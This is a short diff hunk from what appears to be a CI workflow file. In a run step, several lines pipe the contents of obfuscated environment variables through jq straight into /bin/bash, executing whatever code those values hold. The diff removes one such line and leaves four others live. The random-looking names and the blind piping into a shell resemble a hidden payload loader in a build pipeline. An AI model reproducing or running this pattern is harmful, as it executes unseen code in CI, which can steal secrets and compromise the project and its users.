@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$iy4" | jq -r .fsor4596 | /bin/bash
           echo $ysgdr97 | jq -r .kh7 | /bin/bash
-          echo $kxx0528 | jq -r .lnbmh0 | /bin/bash
           echo $lgohy83325 | jq -r .sgil417 | /bin/bash
           echo $azc715 | jq -r .o1800 | /bin/bash
 
